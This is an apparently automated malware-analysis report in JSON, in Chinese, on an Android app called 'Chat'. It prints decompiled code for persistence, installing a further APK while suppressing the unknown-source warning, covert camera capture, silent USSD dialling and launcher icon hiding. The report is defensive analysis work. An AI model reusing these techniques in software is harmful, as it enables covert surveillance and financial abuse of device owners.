@@ -1,0 +1,219 @@
+{
+  "APK信息": {
+    "文件名": "af65aac4f3cf13c88422675b5261acc6c7b5d0af75323a516989a75b0374eddd.apk",
+    "sha256": "af65aac4f3cf13c88422675b5261acc6c7b5d0af75323a516989a75b0374eddd",
+    "包名": "com.app.chat",
+    "应用名": "Chat",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 284.1
+  },
+  "行为列表": [
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\g\\c;",
+          "method_signature": "b(Context context, Class cls, int i)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(context, (Class<?>) cls);\nintent.setAction(\"com.app.chat.action.startforeground\");\na((AlarmManager) context.getSystemService(\"alarm\"), i, PendingIntent.getService(context, 104, intent, 0));",
+          "malicious_code_snippet_context": "  \n      public static void b(Context context, Class cls, int i) {\n          Log.d(a, \"Schedule \" + cls.getSimpleName() + \" after \" + i + \" seconds\");\n>>>         Intent intent = new Intent(context, (Class<?>) cls);\n>>>         intent.setAction(\"com.app.chat.action.startforeground\");\n>>>         a((AlarmManager) context.getSystemService(\"alarm\"), i, PendingIntent.getService(context, 104, intent, 0));\n      }\n  \n      public static void b(Context context, final String str) {",
+          "behavior_description": "该方法通过AlarmManager定时调度一个前台服务（foreground service）的启动。具体流程为：接收Context、目标Service类和延迟时间作为参数 → 构造带有\"com.app.chat.action.startforeground\"动作的Intent → 将其包装为PendingIntent.getService → 通过AlarmManager在指定秒数后触发该PendingIntent，从而实现服务的定时重启与保活。结合同文件中存在的SMS接收记录上报逻辑（sendRecordSmsReceivedRequest），该保活机制用于维持恶意服务持续运行以进行短信拦截与上报。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.UNINSTALL_PACKAGE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\activ\\DAct;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 24)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "File b = b();\nif (Build.VERSION.SDK_INT < 24) {\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(b), \"application/vnd.android.package-archive\");\n    intent.setFlags(268435456);\n    startActivity(intent);\n} else {\n    Uri a = g.a(getBaseContext(), getApplicationContext().getPackageName() + \".provider\", b);\n    Intent intent2 = new Intent(\"android.intent.action.VIEW\", a);\n    intent2.putExtra(\"android.intent.extra.NOT_UNKNOWN_SOURCE\", true);\n    intent2.setDataAndType(a, \"application/vnd.android.package-archive\");\n    intent2.setFlags(268468224);\n    intent2.addFlags(1);",
+          "malicious_code_snippet_context": "      private a d;\n  \n      private void a() {\n>>>         File b = b();\n>>>         if (Build.VERSION.SDK_INT < 24) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(b), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             startActivity(intent);\n>>>             return;\n>>>         }\n>>>         Uri a = g.a(getBaseContext(), getApplicationContext().getPackageName() + \".provider\", b);\n>>>         Intent intent2 = new Intent(\"android.intent.action.VIEW\", a);\n>>>         intent2.putExtra(\"android.intent.extra.NOT_UNKNOWN_SOURCE\", true);\n>>>         intent2.setDataAndType(a, \"application/vnd.android.package-archive\");\n>>>         intent2.setFlags(268468224);\n          intent2.addFlags(1);\n          startActivity(intent2);\n      }",
+          "behavior_description": "代码通过 b() 方法获取一个File对象（疑似从C2服务器下载的恶意APK文件），根据Android SDK版本分别使用 Uri.fromFile()（SDK<24）或 FileProvider（SDK>=24）构造URI，创建ACTION_VIEW Intent并设置MIME类型为application/vnd.android.package-archive，同时尝试设置NOT_UNKNOWN_SOURCE extra以规避未知来源警告，最终通过startActivity调起系统包安装器诱导用户安装该恶意APK payload。数据流向：b()返回的File文件 → Uri.fromFile()/FileProvider构造URI → startActivity()调起系统包安装器",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\activ\\TASD;",
+          "method_signature": "surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.c.takePicture(null, null, new Camera.PictureCallback() {\n    public void onPictureTaken(byte[] bArr, Camera camera) {\n        String format = new SimpleDateFormat(\"yyyyMMdd_HHmmss\").format(Calendar.getInstance().getTime());\n        File file = new File(com.app.chat.app.a.y);\n        if (!file.exists()) { file.mkdirs(); }\n        FileOutputStream fileOutputStream = new FileOutputStream(com.app.chat.app.a.y + \"/pc\" + format + \".jp\");\n        fileOutputStream.write(bArr);\n    }\n});",
+          "malicious_code_snippet_context": "          this.d = this.c.getParameters();\n          this.c.setParameters(this.d);\n          this.c.startPreview();\n>>>         this.c.takePicture(null, null, new Camera.PictureCallback() { // from class: com.app.chat.activ.TASD.3\n>>>             @Override // android.hardware.Camera.PictureCallback\n>>>             public void onPictureTaken(byte[] bArr, Camera camera) {\n>>>                 try {\n>>>                     String format = new SimpleDateFormat(\"yyyyMMdd_HHmmss\").format(Calendar.getInstance().getTime());\n>>>                     File file = new File(com.app.chat.app.a.y);\n>>>                     if (!file.exists()) {\n>>>                         file.mkdirs();\n>>>                     }\n                      FileOutputStream fileOutputStream = new FileOutputStream(com.app.chat.app.a.y + \"/pc\" + format + \".jp\");\n                      fileOutputStream.write(bArr);\n                      fileOutputStream.close();",
+          "behavior_description": "在surfaceChanged回调中自动触发摄像头拍照，无任何用户交互或提示。拍摄的照片数据被写入本地隐藏目录（com.app.chat.app.a.y）中，文件名以时间戳命名。这是典型的隐蔽拍照窃取隐私行为，攻击者可后续窃取这些照片文件造成用户隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\rece\\GFHADLKJ;",
+          "method_signature": "if(com.app.chat.c.a.b(context)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent2 = new Intent(\"android.intent.action.CALL\"); String str = \"*111*5*\" + this.a.a(\"get_number_from_user\") + \"#\"; intent2.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(str)))); context.startActivity(intent2);",
+          "malicious_code_snippet_context": "              if (com.app.chat.c.a.b(context)) {\n                  c.b(context, \"Operation Is: \" + lowerCase);\n              }\n>>>             Intent intent2 = new Intent(\"android.intent.action.CALL\");\n              intent2.setFlags(268468224);\n              com.app.chat.b.a aVar2 = this.a;\n              com.app.chat.b.a aVar3 = this.a;",
+          "behavior_description": "代码检查网络运营商是否为特定运营商(jawwal)，如果是，则从配置中读取号码拼接成USSD代码(*111*5*...#)，并通过ACTION_CALL意图直接发起静默拨号，可能导致用户被订阅高费率服务或扣除话费。数据来源：配置读取(get_number_from_user) -> 危险操作：静默拨打电话(context.startActivity(ACTION_CALL))。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\activ\\MainActivity;",
+          "method_signature": "j()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(this.t, (Class<?>) MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      public void j() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(this.t, (Class<?>) MainActivity.class), 2, 1);\n      }\n  \n      public void login(View view) {",
+          "behavior_description": "调用 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件状态设置为 DISABLED（参数值为2），使应用图标从启动器中隐藏，用户无法在桌面看到或直接打开该应用，从而实现隐蔽驻留。这是 Android 恶意软件常用的图标隐藏手法，通常在用户首次打开应用后触发，使恶意应用在后台持续运行而不被用户察觉。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\chat\\rece\\efdasfrgawdwf;",
+          "method_signature": "if(aVar2.b(\"permissions_granted\")",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (aVar2.b(\"permissions_granted\")) {\n    c.a(context);\n    c.q(context, 10);\n} else {\n    c.h(context, 0);\n    Process.killProcess(Process.myPid());\n}",
+          "malicious_code_snippet_context": "          if (com.app.chat.c.a.b(context)) {\n              com.app.chat.b.a aVar2 = this.b;\n              com.app.chat.b.a aVar3 = this.b;\n>>>             if (aVar2.b(\"permissions_granted\")) {\n>>>                 c.a(context);\n>>>                 c.q(context, 10);\n>>>             } else {\n>>>                 c.h(context, 0);\n>>>                 Process.killProcess(Process.myPid());\n>>>             }\n          }\n      }\n  }",
+          "behavior_description": "代码检查是否已获取权限（permissions_granted），如果未获取权限，则调用 Process.killProcess(Process.myPid()) 终止自身进程。这通常用于在未获得执行恶意行为所需权限时进行自我关闭或反分析对抗。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
